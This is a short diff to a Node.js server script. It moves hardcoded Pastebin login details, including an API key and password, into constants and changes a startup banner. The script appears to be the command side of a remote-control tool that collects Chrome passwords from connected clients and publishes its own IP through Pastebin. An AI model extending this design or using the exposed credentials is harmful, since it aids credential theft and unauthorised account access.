@@ -7,6 +7,11 @@ var paste = require("better-pastebin");
 var colors = require('colors');
 var exec = require('child_process').exec;
 
+var PASTEBIN_USERNAME = "efel"
+var PASTEBIN_PASSWORD = "password"
+var PASTEBIN_KEY = "6624699f38cac4c04962afe4ed8730e0"
+
+
 var clients = [];
 var names = [];
 var chromePasswords = [];
@@ -73,7 +78,7 @@ net.createServer(function (socket) {
 
 //Promt for commands
 function startPromt() {
-  console.log("Chat server running\n".rainbow);
+  console.log("Server running\n".rainbow);
   var rl = readline.createInterface(process.stdin, process.stdout);
   rl.setPrompt('Command -> ');
   rl.prompt();
@@ -87,8 +92,8 @@ function startPromt() {
 function getPublicIP() {
 
   //Create pastebin object
-  paste.setDevKey("6624699f38cac4c04962afe4ed8730e0");
-  paste.login("efel", "password", function (success, data) {
+  paste.setDevKey(PASTEBIN_KEY);
+  paste.login(PASTEBIN_USERNAME, PASTEBIN_PASSWORD, function (success, data) {
     if (!success) {
       console.log("Failed (" + data + ")".red);
       return false;
